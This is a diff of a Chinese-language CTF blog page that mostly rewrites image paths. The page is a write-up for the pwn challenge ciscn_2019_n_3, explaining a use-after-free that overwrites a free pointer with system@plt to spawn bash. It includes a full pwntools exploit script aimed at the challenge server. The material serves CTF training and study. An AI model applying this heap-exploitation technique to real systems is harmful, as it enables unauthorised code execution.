@@ -43,17 +43,17 @@
 <meta property="og:site_name" content="Trick&#39;s Blog">
 <meta property="og:description" content="ciscn_2019">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://trick.ink/.ink//image-20210526120532732.png">
-<meta property="og:image" content="http://trick.ink/.ink//image-20210526121417172.png">
-<meta property="og:image" content="http://trick.ink/.ink//image-20210526121954287.png">
-<meta property="og:image" content="http://trick.ink/.ink//image-20210526122032820.png">
-<meta property="og:image" content="http://trick.ink/.ink//image-20210526123328831.png">
-<meta property="og:image" content="http://trick.ink/.ink//image-20210526124650393.png">
+<meta property="og:image" content="http://trick.ink/2021/06/02/ciscn_2019/ciscn_2019/image-20210526120532732.png">
+<meta property="og:image" content="http://trick.ink/2021/06/02/ciscn_2019/ciscn_2019/image-20210526121417172.png">
+<meta property="og:image" content="http://trick.ink/2021/06/02/ciscn_2019/ciscn_2019/image-20210526121954287.png">
+<meta property="og:image" content="http://trick.ink/2021/06/02/ciscn_2019/ciscn_2019/image-20210526122032820.png">
+<meta property="og:image" content="http://trick.ink/2021/06/02/ciscn_2019/ciscn_2019/image-20210526123328831.png">
+<meta property="og:image" content="http://trick.ink/2021/06/02/ciscn_2019/ciscn_2019/image-20210526124650393.png">
 <meta property="article:published_time" content="2021-06-02T12:21:24.000Z">
 <meta property="article:modified_time" content="2021-07-24T06:35:58.361Z">
 <meta property="article:author" content="Trick">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://trick.ink/.ink//image-20210526120532732.png">
+<meta name="twitter:image" content="http://trick.ink/2021/06/02/ciscn_2019/ciscn_2019/image-20210526120532732.png">
 
 <link rel="canonical" href="http://trick.ink/2021/06/02/ciscn_2019/">
 
@@ -296,18 +296,18 @@
         <h1 id="ciscn-2019"><a href="#ciscn-2019" class="headerlink" title="ciscn_2019"></a>ciscn_2019</h1><span id="more"></span>
 
 <h1 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h1><p>保护</p>
-<p><img src="/.ink//image-20210526120532732.png" alt="image-20210526120532732"></p>
+<p><img src="ciscn_2019/image-20210526120532732.png" alt="image-20210526120532732"></p>
 <p>ida</p>
 <ul>
 <li>new</li>
 </ul>
-<p><img src="/.ink//image-20210526121417172.png" alt="image-20210526121417172"></p>
+<p><img src="ciscn_2019/image-20210526121417172.png" alt="image-20210526121417172"></p>
 <ul>
 <li><p>del</p>
-<p><img src="/.ink//image-20210526121954287.png" alt="image-20210526121954287"></p>
+<p><img src="ciscn_2019/image-20210526121954287.png" alt="image-20210526121954287"></p>
 </li>
 <li><p>dump</p>
-<p><img src="/.ink//image-20210526122032820.png" alt="image-20210526122032820"></p>
+<p><img src="ciscn_2019/image-20210526122032820.png" alt="image-20210526122032820"></p>
 </li>
 </ul>
 <h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><p>uaf漏洞。程序new之前先malloc了0xC的chunk，用来存放 print 和 free 指针</p>
@@ -317,9 +317,9 @@
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.ink//image-20210526123328831.png" alt="image-20210526123328831"></p>
+<p><img src="ciscn_2019/image-20210526123328831.png" alt="image-20210526123328831"></p>
 <p>根据 fastbin FILO 的特性，执行 free(0)、free(1) ，再new一个string类型，便可以修改 free 指针为 system_plt，同时 string 指针的最后一个字节会被修改为 \n (0x0a)，就刚好指向了 print 指针处，把这个地方修改为 bash。执行 free(0) -&gt; system(‘bash’)，达成getshell</p>
-<p><img src="/.ink//image-20210526124650393.png" alt="image-20210526124650393"></p>
+<p><img src="ciscn_2019/image-20210526124650393.png" alt="image-20210526124650393"></p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26908</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="type">Type</span>,content,length=<span class="number">0</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Type &gt; &#x27;</span>,<span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="type">Type</span> == <span class="number">2</span>:        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Length &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;bbbb&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="string">&#x27;bash&#x27;</span>+p32(sys_addr),<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
